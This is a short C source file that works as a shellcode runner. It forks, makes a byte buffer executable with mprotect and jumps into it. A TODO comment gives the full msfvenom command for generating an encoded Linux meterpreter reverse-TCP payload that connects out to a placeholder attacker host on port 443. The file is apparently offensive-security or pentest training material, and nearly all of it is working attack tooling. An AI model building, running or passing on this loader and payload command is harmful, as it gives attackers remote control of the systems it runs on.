#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
// gcc -o runner.out runner.c -z execstack
//
// TODO: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=443 StagerVerifySSLCert=true HandlerSSLCert=/opt/nasa.pem -e x64/xor_dynamic -f c
unsigned char buf[] = "";

int main (int argc, char **argv)
{
    if (fork() == 0)
    {
        intptr_t pagesize = sysconf(_SC_PAGESIZE);
        if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC))
        {
            perror("mprotect");
            return -1;
        }
        // Run our shellcode
        int (*ret)() = (int(*)())buf;
        ret();
    }
    else
    {
        return 0;
    }
}
